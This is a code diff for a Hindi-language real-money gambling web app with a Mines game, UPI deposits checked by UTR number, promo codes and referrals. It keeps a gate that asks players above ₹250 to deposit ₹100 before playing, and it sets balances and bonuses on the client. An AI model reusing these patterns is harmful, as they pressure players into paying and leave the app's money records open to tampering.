+              {user.balance <= 0 ? '⛔ बैलेंस खत्म' : user.balance < betAmount ? '⛔ पर्याप्त बैलेंस नहीं' : '▶️ खेल शुरू करें (₹' + betAmount + ')'}
             </button>
           ) : (<button onClick={() => handleCashout()} disabled={currentMultiplier <= 1.0} className="w-full py-4 rounded-xl font-bold text-lg btn-primary mb-8 disabled:opacity-50">💵 कैशआउट (₹{Math.floor(betAmount * currentMultiplier)})</button>)}
           <div className="grid grid-cols-5 gap-2 flex-grow">{grid.map((box, i) => (<button key={i} onClick={() => handleBoxClick(i)} disabled={box.state !== 'hidden' || !isPlaying} className={`mine-box aspect-square rounded-2xl flex items-center justify-center text-2xl font-bold border-2 ${box.state === 'hidden' ? 'bg-slate-800 border-white/10' : (box.isBomb ? 'bg-red-900/80 border-red-500' : 'bg-green-900/80 border-green-500')}`}>{box.state === 'hidden' ? '❓' : (box.isBomb ? '💣' : '💎')}</button>))}</div>
@@ -1647,23 +1625,10 @@
           if (ref) setRefCode(ref.toUpperCase());
         } catch(e) {}
         
-        const deviceId = getDeviceId();
-        const users = getUsers();
-        const deviceUsers = Object.values(users).filter(u => u.deviceId === deviceId);
-        if (deviceUsers.length >= 2) {
-          setIsBlocked(true);
-          deviceUsers.forEach(u => {
-            saveUserToDB(u.id, { isBlocked: true });
-          });
-        }
+        // Removed auto-block on mount. Admin will block from panel.
       }, []);
 
-      const handleAuth = async () => {
-        if (isBlocked) {
-          showColorfulToast("यह गलत है - इस डिवाइस से एक से ज्यादा आईडी बनाना मना है!", 'error');
-          return;
-        }
-        
+      const handleAuth = async () => {        
         if (isLogin) {
           if (!mobile || !pass) return showColorfulToast("मोबाइल और पासवर्ड दर्ज करें", 'warning');
           const users = getUsers();
@@ -1682,13 +1647,6 @@
               showColorfulToast("यह गलत है - आपका अकाउंट ब्लॉक है!", 'error');
               return;
             }
-            const deviceId = getDeviceId();
-            const allUsers = getUsers();
-            const deviceUsers = Object.values(allUsers).filter(u => u.deviceId === deviceId);
-            if (deviceUsers.length >= 2 && !deviceUsers.some(u => u.id === foundUser.id)) {
-              showColorfulToast("यह गलत है - इस डिवाइस से एक से ज्यादा आईडी बनाना मना है!", 'error');
-              return;
-            }
             localStorage.setItem('tp_logged_in', JSON.stringify(foundUser)); 
             onSignup(foundUser); 
           }
@@ -1700,10 +1658,10 @@
           const localUsers = getUsers();
           const deviceId = getDeviceId();
           
+          // Prevent multiple accounts from the same device (Anti-Fraud)
           const deviceUsers = Object.values(localUsers).filter(u => u.deviceId === deviceId);
           if (deviceUsers.length >= 1) {
-            setIsBlocked(true);
-            showColorfulToast("यह गलत है - इस डिवाइस से एक से ज्यादा आईडी बनाना मना है!", 'error');
+            showColorfulToast("इस डिवाइस से पहले ही एक अकाउंट बनाया जा चुका है। एकाउंट ब्लॉक होने से बचने के लिए पुराने से लॉगिन करें।", 'warning');
             return;
           }
           
@@ -1714,11 +1672,11 @@
               if (Object.values(allDbUsers).find(u => u.mobile === mobile)) {
                 return showColorfulToast("यह मोबाइल नंबर पहले से रजिस्टर्ड है", 'error');
               }
-            } catch(e) {
-              if (Object.values(localUsers).find(u => u.mobile === mobile)) return showColorfulToast("यह मोबाइल नंबर पहले से रजिस्टर्ड है", 'error');
-            }
-          } else {
-            if (Object.values(localUsers).find(u => u.mobile === mobile)) return showColorfulToast("यह मोबाइल नंबर पहले से रजिस्टर्ड है", 'error');
+              const deviceUsersInDb = Object.values(allDbUsers).filter(u => u.deviceId === deviceId);
+              if (deviceUsersInDb.length >= 1) {
+                return showColorfulToast("इस डिवाइस से पहले ही एक अकाउंट बनाया जा चुका है।", 'error');
+              }
+            } catch(e) {}
           }
           
           const newId = genId();
@@ -1767,7 +1725,7 @@
             referralCode: genRef(name), 
             wins: 0, 
             losses: 0, 
-            depositHistory: [{ amount: 50, time: new Date().toLocaleString(), desc: 'Signup Bonus' }],
+            depositHistory: [{ amount: 50, time: new Date().toLocaleString(), desc: 'Signup Bonus', status: 'Success' }],
             withdrawHistory: [], 
             gameHistory: [], 
             sessionWinnings: 0, 
@@ -1929,12 +1887,10 @@
               {user.balance <= 0 && <span className="text-[8px] bg-red-500 text-white px-2 py-0.5 rounded-full">⛔ बैलेंस खत्म</span>}
               {(user.balance >= 250 && !user.hasDepositedAfter250) && <span className="text-[8px] bg-red-500 text-white px-2 py-0.5 rounded-full">⛔ डिपॉजिट करें</span>}
             </button>
-            <button onClick={() => setScreen('mines')} disabled={user.balance < 50 || user.balance > 100 || user.isBlocked} className="bg-gradient-to-br from-purple-800 to-purple-900 p-4 rounded-2xl flex flex-col items-center gap-2 border border-white/5 active:scale-95 transition-transform shadow-lg disabled:opacity-50">
+            <button onClick={() => setScreen('mines')} disabled={user.balance < 10 || user.isBlocked} className="bg-gradient-to-br from-purple-800 to-purple-900 p-4 rounded-2xl flex flex-col items-center gap-2 border border-white/5 active:scale-95 transition-transform shadow-lg disabled:opacity-50">
               <span className="text-4xl drop-shadow">💣</span>
               <span className="text-sm font-bold">Mines</span>
               {user.balance <= 0 && <span className="text-[8px] bg-red-500 text-white px-2 py-0.5 rounded-full">⛔ बैलेंस खत्म</span>}
-              {user.balance < 50 && user.balance > 0 && <span className="text-[8px] bg-red-500 text-white px-2 py-0.5 rounded-full">⛔ ₹50 चाहिए</span>}
-              {user.balance > 100 && <span className="text-[8px] bg-red-500 text-white px-2 py-0.5 rounded-full">⛔ डिपॉजिट करें</span>}
             </button>
           </div>
           
@@ -1956,12 +1912,14 @@
       const [amount, setAmount] = useState(''); const [tab, setTab] = useState('deposit'); const [historyTab, setHistoryTab] = useState('deposit'); const [bankDetails, setBankDetails] = useState(user.bankDetails || { bankName: '', accName: '', accNumber: '', ifsc: '' }); const [promoInput, setPromoInput] = useState(''); 
       const [toast, setToast] = useState(null); 
       const [processingPayment, setProcessingPayment] = useState(false);
+      const [showUtrInput, setShowUtrInput] = useState(false);
+      const [utrNumber, setUtrNumber] = useState('');
       const config = getConfig(); const banks = config.bankList || ["SBI", "HDFC", "ICICI", "Axis", "Other"]; 
       const quickAmounts = (config.depositAmounts && config.depositAmounts.length > 0) ? config.depositAmounts : [100, 200, 500, 1000];
       
       const totalDeposits = (user.depositHistory || []).reduce((sum, d) => {
-        if (d.desc === 'Signup Bonus' || d.desc === 'Promo Code' || d.desc === 'Auto Bonus') return sum;
-        return sum + (parseInt(d.amount) || 0);
+        if (d.status === 'Success' && d.desc !== 'Signup Bonus' && d.desc !== 'Promo Code') return sum + (parseInt(d.amount) || 0);
+        return sum;
       }, 0);
       
       const gamesPlayed = user.gamesPlayed || 0;
@@ -1969,96 +1927,50 @@
 
       const showToastLocal = (msg) => { setToast({ msg }); setTimeout(() => setToast(null), 2500); };
 
-      useEffect(() => {
-        ZapUPI.setPaymentCallbacks({
-          onSuccess: function(orderId) {
-            const amt = parseInt(localStorage.getItem('tp_pending_amt') || '0');
-            if (!isNaN(amt) && amt > 0) {
-              let newBalance = user.balance + amt;
-              let newWd = user.withdrawableBalance;
-              const newHistory = [...(Array.isArray(user.depositHistory) ? user.depositHistory : []), { 
-                amount: amt, 
-                time: new Date().toLocaleString(), 
-                ts: Date.now(),
-                desc: 'ZapUPI Deposit', 
-                orderId: orderId
-              }];
-              
-              let updates = { 
-                balance: newBalance, 
-                withdrawableBalance: newWd,
-                depositHistory: newHistory.slice(-20), 
-                isDepositBonus: amt >= 100,
-                hasDepositedAfter250: amt >= 100 ? true : (user.hasDepositedAfter250 || false)
-              };
+      const submitUtr = () => {
+        if (!utrNumber || utrNumber.length < 10) {
+          return showColorfulToast('कृपया सही 12 अंकों का UTR दर्ज करें', 'warning');
+        }
+        
+        const amt = parseInt(amount);
+        if (!amt || amt <= 0) return showColorfulToast('कृपया राशि चुनें', 'warning');
 
-              if (!user.isReferralBonusClaimed && user.referredBy && amt >= 100) {
-                updates.isReferralBonusClaimed = true;
-                const allUsers = getUsers();
-                const referrerId = Object.keys(allUsers).find(id => allUsers[id].referralCode === user.referredBy);
-                if (referrerId) {
-                  const refBonus = 50;
-                  const refUpdates = {
-                    referralEarnings: (allUsers[referrerId].referralEarnings || 0) + refBonus,
-                    balance: (allUsers[referrerId].balance || 0) + refBonus,
-                    referralCount: (allUsers[referrerId].referralCount || 0) + 1
-                  };
-                  
-                  if (window.db) {
-                    window.db.ref('tp_users/' + referrerId).update(refUpdates);
-                  }
-                  
-                  const localUsers = getUsers();
-                  if (localUsers[referrerId]) {
-                    localUsers[referrerId] = { ...localUsers[referrerId], ...refUpdates };
-                    localStorage.setItem('tp_users', JSON.stringify(localUsers));
-                  }
-                }
-              }
-              
-              onUpdate(updates);
-              showColorfulToast(`₹${amt} सफलतापूर्वक जमा हुए! 🎉`, 'success');
-              setAmount('');
-              setProcessingPayment(false);
-              localStorage.removeItem('tp_pending_amt');
-            }
-          },
-          onFailed: function(orderId) { 
-            showColorfulToast("Payment Failed. Order: " + orderId, 'error');
-            setProcessingPayment(false); 
-          },
-          onTimeout: function(orderId) { 
-            showColorfulToast("Payment Timed Out. Order: " + orderId, 'warning');
-            setProcessingPayment(false); 
-          }
-        });
-      }, [user, onUpdate]);
+        const txId = 'DEP' + Date.now();
+        const newTx = { 
+            amount: amt, 
+            time: new Date().toLocaleString(), 
+            ts: Date.now(), 
+            status: "Pending", 
+            utr: utrNumber, 
+            desc: 'UPI Deposit (UTR)' 
+        };
+        
+        const newHistory = [...(Array.isArray(user.depositHistory) ? user.depositHistory : []), newTx];
+        
+        onUpdate({ depositHistory: newHistory.slice(-20) });
+        
+        if (window.db) {
+            window.db.ref('tp_pending_deposits/' + txId).set({
+                userId: user.id,
+                userName: user.name,
+                amount: amt,
+                utr: utrNumber,
+                timestamp: Date.now(),
+                status: "Pending"
+            });
+        }
+        
+        showColorfulToast('डिपॉजिट अनुरोध सफलतापूर्वक सबमिट हुआ! ✅ एडमिन अप्रूव करेंगे।', 'success');
+        setUtrNumber('');
+        setShowUtrInput(false);
+        setProcessingPayment(false);
+      };
 
       const handleDeposit = () => {
         const amt = parseInt(amount);
-        if (!amt || amt <= 0) return showColorfulToast('कृपया एक राशि चुनें', 'warning');
-        
+        if (!amt || amt <= 0) return showColorfulToast('कृपया राशि चुनें', 'warning');
         setProcessingPayment(true);
-        localStorage.setItem('tp_pending_amt', amt.toString());
-        const orderId = "ORD" + Date.now() + Math.floor(Math.random() * 10000);
-        
-        ZapUPI.createOrder(
-          { 
-            zap_key: ZAPUPI_API_KEY,
-            order_id: orderId, 
-            amount: amt.toString(), 
-            remark: "RoyalCasino | " + user.id 
-          },
-          {
-            onResponse: function(paymentUrl, orderId, data) { 
-              ZapUPI.loadPayment(paymentUrl);
-            },
-            onError: function(err) { 
-              showColorfulToast("Order Error: " + err, 'error');
-              setProcessingPayment(false); 
-            }
-          }
-        );
+        setShowUtrInput(true);
       };
 
       const handleSaveBank = () => { if (!bankDetails.bankName || !bankDetails.accName || !bankDetails.accNumber || !bankDetails.ifsc) return showColorfulToast("कृपया सभी बैंक विवरण भरें", 'warning'); onUpdate({ bankDetails }); showColorfulToast("बैंक डिटेल्स अपडेट हो गई!", 'success'); };
@@ -2077,7 +1989,7 @@
         showColorfulToast(`₹${amt} का विड्रॉल अनुरोध सफल! ✅`, 'success'); 
         setAmount(''); 
       };
-      const handleApplyPromo = () => { const code = promoInput.toUpperCase(); const promo = (config.promoCodes || []).find(p => p.code === code && p.isActive); if (!promo) return showColorfulToast("अमान्य या समाप्त प्रोमो कोड।", 'error'); if (user.usedPromos?.includes(code)) return showColorfulToast("आपने इस प्रोमो कोड का उपयोग पहले कर लिया है।", 'warning'); const promoAmount = parseInt(promo.amount) || 0; const newBalance = user.balance + promoAmount; const newUsedPromos = [...(Array.isArray(user.usedPromos) ? user.usedPromos : []), code]; const newDepoHistory = [...(Array.isArray(user.depositHistory) ? user.depositHistory : []), { amount: promoAmount, time: new Date().toLocaleString(), desc: 'Promo Code' }]; onUpdate({ balance: newBalance, usedPromos: newUsedPromos, depositHistory: newDepoHistory.slice(-20) }); showColorfulToast(`₹${promoAmount} सफलतापूर्वक आपके अकाउंट में जोड़ दए गए हैं! 🎉`, 'success'); setPromoInput(''); };
+      const handleApplyPromo = () => { const code = promoInput.toUpperCase(); const promo = (config.promoCodes || []).find(p => p.code === code && p.isActive); if (!promo) return showColorfulToast("अमान्य या समाप्त प्रोमो कोड।", 'error'); if (user.usedPromos?.includes(code)) return showColorfulToast("आपने इस प्रोमो कोड का उपयोग पहले कर लिया है।", 'warning'); const promoAmount = parseInt(promo.amount) || 0; const newBalance = user.balance + promoAmount; const newUsedPromos = [...(Array.isArray(user.usedPromos) ? user.usedPromos : []), code]; const newDepoHistory = [...(Array.isArray(user.depositHistory) ? user.depositHistory : []), { amount: promoAmount, time: new Date().toLocaleString(), desc: 'Promo Code', status: 'Success' }]; onUpdate({ balance: newBalance, usedPromos: newUsedPromos, depositHistory: newDepoHistory.slice(-20) }); showColorfulToast(`₹${promoAmount} सफलतापूर्वक आपके अकाउंट में जोड़ दए गए हैं! 🎉`, 'success'); setPromoInput(''); };
       
       return (
         <div className="app-wrapper bg-slate-900 text-white p-4 flex flex-col">
@@ -2093,14 +2005,54 @@
           
           {tab === 'deposit' ? (
             <React.Fragment>
-              <div className="grid grid-cols-3 gap-2 mb-6">
-                {quickAmounts.map(a => (
-                  <button key={a} onClick={() => setAmount(a.toString())} className={`py-3 rounded-lg text-sm border font-bold transition-transform ${amount === a.toString() ? 'bg-yellow-500 text-slate-900 border-yellow-400 scale-105 shadow-lg' : 'bg-slate-800 border-white/10 text-white active:scale-95'}`}>₹{a}</button>
-                ))}
-              </div>
-              <button onClick={handleDeposit} disabled={processingPayment || !amount} className="w-full py-3 rounded-xl font-bold text-lg btn-green mb-4 disabled:opacity-50 flex justify-center items-center gap-2">
-                {processingPayment ? <React.Fragment><div className="w-5 h-5 border-2 border-white border-t-transparent rounded-full animate-spin"></div> प्रोसेसिंग...</React.Fragment> : `💰 ₹${amount || 0} डिपॉजिट करें`}
-              </button>
+              {!showUtrInput ? (
+                <>
+                  <div className="grid grid-cols-3 gap-2 mb-6">
+                    {quickAmounts.map(a => (
+                      <button key={a} onClick={() => setAmount(a.toString())} className={`py-3 rounded-lg text-sm border font-bold transition-transform ${amount === a.toString() ? 'bg-yellow-500 text-slate-900 border-yellow-400 scale-105 shadow-lg' : 'bg-slate-800 border-white/10 text-white active:scale-95'}`}>₹{a}</button>
+                    ))}
+                  </div>
+                  <button onClick={handleDeposit} disabled={!amount} className="w-full py-3 rounded-xl font-bold text-lg btn-green mb-4 disabled:opacity-50 flex justify-center items-center gap-2">
+                    💰 ₹{amount || 0} डिपॉजिट करें
+                  </button>
+                </>
+              ) : (
+                <div className="bg-slate-800 p-4 rounded-xl mb-6 border border-white/10">
+                  <h3 className="font-bold text-yellow-400 mb-3 text-center text-lg">₹{amount} का पेमेंट करें</h3>
+                  
+                  <div className="bg-slate-900 p-4 rounded-xl mb-4 border border-yellow-500/30">
+                    <div className="text-xs text-gray-400 mb-1 text-center">यहाँ भेजें (UPI ID):</div>
+                    <div className="text-lg font-mono font-bold text-green-400 flex justify-between items-center">
+                      <span>{UPI_ID}</span>
+                      <button onClick={() => { navigator.clipboard.writeText(UPI_ID); showColorfulToast('UPI ID कॉपी हो गई! 📋', 'success'); }} className="text-xs bg-green-700 px-2 py-1 rounded">कॉपी</button>
+                    </div>
+                  </div>
+
+                  <div className="text-left mb-4">
+                    <div className="text-sm text-gray-300 mb-2 font-bold">⚠️ निर्देश:</div>
+                    <ul className="text-xs text-gray-400 list-disc pl-4 space-y-1 mb-3">
+                      <li>उपरोक्त UPI ID पर ₹{amount} भेजें।</li>
+                      <li>पेमेंट के बाद अपना 12 अंकों का UTR नंबर नीचे दर्ज करें।</li>
+                      <li>एडमिन द्वारा वेरिफाई होने पर बैलेंस तुरंत जुड़ जाएगा।</li>
+                    </ul>
+                    <input 
+                      type="text" 
+                      placeholder="12 अंकों का UTR दर्ज करें" 
+                      value={utrNumber} 
+                      onChange={(e) => setUtrNumber(e.target.value.replace(/\D/g, ''))} 
+                      maxLength={12}
+                      className="w-full px-4 py-3 rounded-lg bg-slate-900 border border-white/10 text-white text-center font-mono outline-none focus:border-yellow-500"
+                    />
+                  </div>
+
+                  <button onClick={submitUtr} className="w-full py-3 rounded-xl font-bold text-lg btn-green mb-2">
+                    ✅ UTR सबमिट करें
+                  </button>
+                  <button onClick={() => { setShowUtrInput(false); setProcessingPayment(false); }} className="w-full py-2 text-gray-400 text-sm hover:text-white">
+                    रद्द करें
+                  </button>
+                </div>
+              )}
               <div className="bg-slate-800 p-4 rounded-xl mb-8 border border-white/10"><h3 className="font-bold text-yellow-400 mb-2 text-sm">🎁 प्रोमो कोड रिडीम करें</h3><div className="flex gap-2"><input type="text" placeholder="प्रोमो कोड दर्ज करें" value={promoInput} onChange={(e) => setPromoInput(e.target.value)} className="flex-1 px-4 py-2 rounded-lg bg-slate-900 border border-white/10 text-white outline-none uppercase" /><button onClick={handleApplyPromo} className="bg-purple-600 text-white px-4 py-2 rounded-lg font-bold">लागू करें</button></div></div>
             </React.Fragment>
           ) : (
@@ -2142,7 +2094,7 @@
                       <div className="w-10 h-10 rounded-full flex items-center justify-center text-lg bg-green-900/40 text-green-400 border border-green-500/30">💰</div>
                       <div><div className="font-bold text-white text-sm">{tx.desc || 'डिपॉजिट'}</div><div className="text-[10px] text-gray-400">{tx.time}</div></div>
                     </div>
-                    <div className="text-right"><div className="font-bold text-green-500">+ ₹{tx.amount}</div><div className="text-[10px] text-green-600 font-semibold mt-1">सफल</div></div>
+                    <div className="text-right"><div className="font-bold text-green-500">+ ₹{tx.amount}</div><div className={`text-[10px] font-semibold mt-1 ${tx.status === 'Pending' ? 'text-yellow-400' : tx.status === 'Rejected' ? 'text-red-400' : 'text-green-600'}`}>{tx.status === 'Pending' ? '⏳ लंबित' : tx.status === 'Rejected' ? '❌ असफल' : '✅ सफल'}</div></div>
                   </div>
                 ))
               ) : (
@@ -2272,7 +2224,7 @@
             <h2 className="text-2xl font-bold text-yellow-400 mb-2">बैलेंस खत्म!</h2>
             <p className="text-gray-400 text-sm text-center mb-6">
               आपका बैलेंस 0 हो गया है।<br/>
-              गेम खेलने के लिए ₹100 डिपॉजिट करें।
+              गेम खेलने के लिए वॉलेट में जाकर डिपॉजिट करें।
             </p>
             <button onClick={onBack} className="px-6 py-2 rounded-lg btn-primary font-bold">वापस जाएं</button>
           </div>
@@ -2286,7 +2238,7 @@
             <h2 className="text-2xl font-bold text-yellow-400 mb-2">₹250+ बैलेंस!</h2>
             <p className="text-gray-400 text-sm text-center mb-6">
               आपका बैलेंस ₹250 से ज्यादा हो गया है।<br/>
-              गेम खेलने के लिए ₹100 डिपॉजिट करें।
+              गेम खेलने के लिए वॉलेट में जाकर ₹100 डिपॉजिट करें।
             </p>
             <button onClick={onBack} className="px-6 py-2 rounded-lg btn-primary font-bold">वापस जाएं</button>
           </div>
@@ -2441,8 +2393,8 @@
             <div className="space-y-2 max-h-60 overflow-y-auto no-scrollbar">
               {referredUsers.length > 0 ? referredUsers.map((u, i) => {
                 const totalDep = (u.depositHistory || []).reduce((sum, d) => {
-                  if (d.desc === 'Signup Bonus' || d.desc === 'Promo Code' || d.desc === 'Auto Bonus' || d.desc === 'Admin Added') return sum;
-                  return sum + (parseInt(d.amount) || 0);
+                  if (d.status === 'Success' && d.desc !== 'Signup Bonus' && d.desc !== 'Promo Code') return sum + (parseInt(d.amount) || 0);
+                  return sum;
                 }, 0);
                 const hasDeposited = totalDep >= 100;
 
